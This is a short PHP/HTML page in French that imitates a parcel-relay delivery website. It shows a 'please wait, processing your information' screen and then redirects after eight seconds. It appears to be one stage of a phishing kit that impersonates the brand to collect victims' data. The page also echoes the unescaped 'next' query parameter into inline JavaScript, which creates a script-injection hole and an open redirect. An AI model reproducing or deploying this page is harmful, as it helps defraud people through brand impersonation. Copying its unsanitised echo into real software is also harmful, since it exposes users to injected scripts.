<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Attendez</title>
</head>
<body>

<header>

    <div class="left">

<div class="logo">
<img src="res/img/logo.png" >
</div>

    </div>

    <div class="right">
<label> Suivi de colis</label> <label > Envoi de colis</label> <label > Points Relais® <br>
et Lockers</label> <label > Aide</label>

 <button type="button">Se connecter</button>

    </div>
</header>


    
    

<main>



    <div class="continer">
    
<div class="titles_holder" style="padding:10px;">
<h2>S'il vous plaît, attendez......</h2>
</div>


<div class="heads">
<p>Traitement de vos informations...</p>
<div class="loding"><img src="res/img/loading.gif" style="width:60px;"></div>
 
</div>


<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>



</body>
</html>